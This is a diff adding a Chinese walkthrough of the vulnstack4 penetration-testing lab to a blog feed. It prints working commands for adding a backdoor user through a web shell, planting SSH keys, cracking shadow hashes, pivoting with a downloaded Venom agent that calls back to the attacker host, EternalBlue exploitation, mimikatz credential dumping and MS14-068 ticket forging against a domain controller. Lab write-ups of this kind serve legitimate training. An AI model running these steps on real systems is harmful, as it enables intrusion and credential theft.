@@ -484,6 +484,129 @@
 <p>在根目录下创建一个test文件夹，将sda1挂载到该文件夹下：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /test</span><br><span class="line">mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>
 
+<p>查看&#x2F;test 文件夹看看：</p>
+<p><img src="/../images/vulnstack4/13.png"></p>
+<p>可以看到成功挂载</p>
+<h4 id="登录ubuntu"><a href="#登录ubuntu" class="headerlink" title="登录ubuntu"></a>登录ubuntu</h4><h5 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h5><p>查看kali中的&#x2F;etc&#x2F;passwd 并找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:x:1000:1000:kali,,,:/home/kali:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>添加到Ubuntu的&#x2F;etc&#x2F;passwd 中（可以在冰蝎的文件管理中直接添加）</p>
+<p>查看kali中的&#x2F;etc&#x2F;shadow并找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali:$y$j9T$hAYSTtIb9K7XVvOTfnSl01$Ew7qmWAY34D.2f2t8XbsYwy72sJRAd.JtsC7JeAt3jB:20031:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>添加到Ubuntu的&#x2F;etc&#x2F;shadow中（可以在冰蝎的文件管理中直接添加）</p>
+<p>但是我在实际操作过程中发现行不通（网上有的教程通过这个方法是可以的）（而且如果忘记删除kali添加到Ubuntu 的&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow的数据，在下次开机会发现无法正常登录，需要进入单用户模式进行登录，参考文章：<a href="https://www.cnblogs.com/v5captain/p/13961143.html">Ubuntu 20 按ESC进入单用户模式 single user mode - 船长博客 - 博客园</a>，删除kali添加的数据后就可以正常登录了）,我推测是对密码的加密方式不同导致的。试验过在Ubuntu中创建一个新的用户，并记录下&#x2F;etc&#x2F;passwd 和&#x2F;etc&#x2F;shadow 中对应的数据，然后在Ubuntu中删除了这个用户。将得到的数据在kali的冰蝎中添加到Ubuntu中，是可以成功登录Ubuntu的（登录过程：执行命令<strong>ssh ubuntu@ubuntu的ip</strong> ）</p>
+<h5 id="伪造ssh密钥"><a href="#伪造ssh密钥" class="headerlink" title="伪造ssh密钥"></a>伪造ssh密钥</h5><p>这个我在自己操作的过程也是行不通的，原因至今没找到。操作过程如下：</p>
+<ul>
+<li><p>在kali中使用 <code>ssh-keygen</code> 命令来创建SSH的密钥， <code>-f</code> 参数用于指定生成密钥文件的名称路径，随后系统会提示你输入一个passphrase(密钥短语)，这是一个可选步骤，若添加了可以提高密钥的安全性，若私钥落入他人手中，他们还需要知道密钥短语才能使用该私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f mykey</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>随后会在当前目录生成私钥和公钥文件，我们需要将公钥(后缀为.pub)放置到目标服务器上，可以使用 <code>wget</code> 命令将公钥上传至目标服务器的 <code>.ssh</code> 目录，并将文件名修改为 <code>authorized_keys</code>，并修改其权限为600</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://192.168.47.188:8000/mykey.pub</span><br><span class="line"><span class="built_in">mv</span> mykey.pub authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 authorize_keys</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>随后在kali中使用对应的私钥连接目标主机的ubuntu用户(ip根据实际情况修改为Ubuntu的ip)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i mykey ubuntu@192.168.47.186</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>一些常见问题的解决方法：</p>
+<p><a href="https://blog.csdn.net/lisongjia123/article/details/78513244">解决SSH免密登录配置成功后不生效问题_麒麟3.2免密登录不生效-CSDN博客</a></p>
+<p><a href="https://juejin.cn/post/7067816759759208478">解决SSH免密登录配置成功后不生效问题很简单，重点就两步，分布式scp ~&#x2F;.ssh&#x2F;authorized_keys 中 - 掘金</a></p>
+</li>
+</ul>
+<h5 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h5><p>我实际操作是通过这个方法登录到Ubuntu的。进入Ubuntu的&#x2F;etc&#x2F;shadow 中：</p>
+<p><img src="/../images/vulnstack4/14.png"></p>
+<p>将：**ubuntu:$6$lPBp.Pfx$RjN2ZeXfzjbLK1ukC6t.b09GYRPMTseene6RBkg4kWFEFKKoxJWwzbZhI&#x2F;y9BHMW6hd8dJCNVgUfRjEpdtvB2.:20060:0:99999:7:::**复制保存得到一个文本文件中，使用john破解：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john pp --wordlist=/home/kali/dictionary/3000个弱口令.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里的–wordlist参数是指定字典，如果不加这个参数则使用john自带的字典。从下面的结果可以看到Ubuntu的密码是root(Ubuntu的原始密码是ubuntu)</p>
+<p><img src="/../images/vulnstack4/15.png"></p>
+<p>利用得到的密码使用ssh成功登录Ubuntu：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh ubuntu@192.168.157.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/16.png"></p>
+<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><ol>
+<li><p>端口转发：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -D 8081 ubuntu@192.168.157.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/17.png"></p>
+<blockquote>
+<p>执行这条命令的意思是将经过8081端口流量的都转发到Ubuntu中，这样这些流量就可以到达Ubuntu的内网中了</p>
+</blockquote>
+</li>
+<li><p>修改proxychain4.conf文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychain4.conf</span><br></pre></td></tr></table></figure>
+
+<p>找到最下面，将端口号改为8081：</p>
+<p><img src="/../images/vulnstack4/18.png"></p>
+</li>
+<li><p>nmap扫描</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -sV -Pn -n  192.168.183.0/24</span><br></pre></td></tr></table></figure>
+
+<p>这条命令的效果就类似于在Ubuntu中安装了nmap对192.168.183.0&#x2F;24进行扫描，注意<em><strong>nmap的ping是依据icmp包进行传输的。而proxychains无法代理icmp包。所以nmap + ip地址是无法进行探测的</strong></em></p>
+<p>最终可以扫出两台内网靶机的ip地址（192.168.183.133和192.168.183.130）及开放的端口</p>
+</li>
+</ol>
+<h4 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h4><p>使用msf进行后渗透，尝试用proxychains4进行代理老是有问题，所有就改用Venom（下载地址：<a href="https://github.com/Dliv3/Venom">Dliv3&#x2F;Venom: Venom - A Multi-hop Proxy for Penetration Testers</a>）</p>
+<p>将客户端发送给Ubuntu：</p>
+<blockquote>
+<p>在kali的Venom目录下执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8989</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/20.png"></p>
+<p>在Ubuntu中执行wget命令进行下载客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.157.129:8989/agent_linux_x64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/21.png"></p>
+</blockquote>
+<p>在kali执行命令，监听5555端口：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/22.png"></p>
+<p>在Ubuntu中执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x agent_linux_x64 （给客户端执行权限）</span><br><span class="line">./agent_linux_x64 -rhost 192.168.157.129 -rport 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/23.png"></p>
+<p>执行完后在kali中查看，可以看到成功连接，进入node 建立一个socks 端口指定为7777</p>
+<p><img src="/../images/vulnstack4/24.png"></p>
+<p>这样kali和Ubuntu就建立了一个socks5连接</p>
+<p>使用<strong>scanner&#x2F;smb&#x2F;smb_ms17_010</strong>模块查看win7这台主机发现存在永恒之蓝漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setg proxies socks5:127.0.0.1:7777(setg设置为全局参数)</span><br><span class="line">set rhost 192.168.183.133</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/25.png"></p>
+<p>使用<strong>windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong>模块对win7这台靶机进行攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.133</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/26.png"></p>
+<p><img src="/../images/vulnstack4/27.png"></p>
+<p>进入shell，可以看到拿到了system权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">chap 65001 (解决乱码问题)</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/28.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/29.png"></p>
+<p>可以看到所处的域是demo.com，域控ip是192.168.183.130</p>
+<h5 id="mimikatz导出凭据"><a href="#mimikatz导出凭据" class="headerlink" title="mimikatz导出凭据"></a>mimikatz导出凭据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi  (加载mimikatz)</span><br><span class="line">creds_all  (列举内存凭据)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/30.png"></p>
+<p>可以获取到PC机的凭据： <code>douser:Dotest123</code>(假如这里没有看到这个可能是win开机后就没有登录进去过，登录进去再执行命令应该就可以看到了)</p>
+<p>使用mimikatz的 <code>sekurlsa::logonpasswords</code> 命令列出用户hash，此处Dotest用户SID为 <code>S-1-5-21-979886063-1111900045-1414766810-1107</code>     (<code>sekurlsa::logonpasswords</code> 命令用于列出所有可用的身份验证提供程序凭据，能够从Windows的<code>lsass.exe</code>进程中提取密码、密钥、PIN码和Kerberos票据等敏感信息。)</p>
+<p><img src="/../images/vulnstack4/31.png"></p>
+<p>win7这台靶机存在ms14-068漏洞（怎么知道的？当然是作者说的doge）(实际中可以执行命令systeminfo来查看补丁情况来看看可以利用哪些漏洞)</p>
+<h5 id="ms14-068漏洞"><a href="#ms14-068漏洞" class="headerlink" title="ms14-068漏洞"></a>ms14-068漏洞</h5><p>进入<strong>c:\Users\douser\Desktop</strong>目录下,执行<strong>ms14-068</strong>查看所需要的参数：</p>
+<p><img src="/../images/vulnstack4/32.png"></p>
+<p>可以看到这些参数我们都在前面查询到了，现在开始利用这个漏洞打域控：</p>
+<p><img src="/../images/vulnstack4/33.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz (进入mimikatz)</span><br><span class="line">kerberos::ptc TGT_douser@demo.com.ccache (将该票据导入到当前用户的Kerberos票据缓存中。)</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$  (进入域控的c盘)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/vulnstack4/34.png"></p>
+<p>可以看到成功进入域控c盘</p>
+<h4 id="参考大佬的链接："><a href="#参考大佬的链接：" class="headerlink" title="参考大佬的链接："></a>参考大佬的链接：</h4><p>[<a href="https://www.bilibili.com/video/BV19r4y1y7Nk/?spm_id_from=333.337.search-card.all.click&vd_source=83faec40f3919a69a706f1d9fe9f0e04">网络安全&#x2F;域渗透]内网安全入门靶场 vulnstack4攻略_哔哩哔哩_bilibili</a></p>
+<p><a href="https://stack.chaitin.com/techblog/detail/251">内网渗透:VulnStack4靶场全方位打法 - CT Stack 安全社区</a></p>
+<p><a href="https://blog.csdn.net/qq_39583774/article/details/133650244">【红日靶场】vulnstack4-完整渗透过程_红日靶场ms-14-068-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>渗透</category>
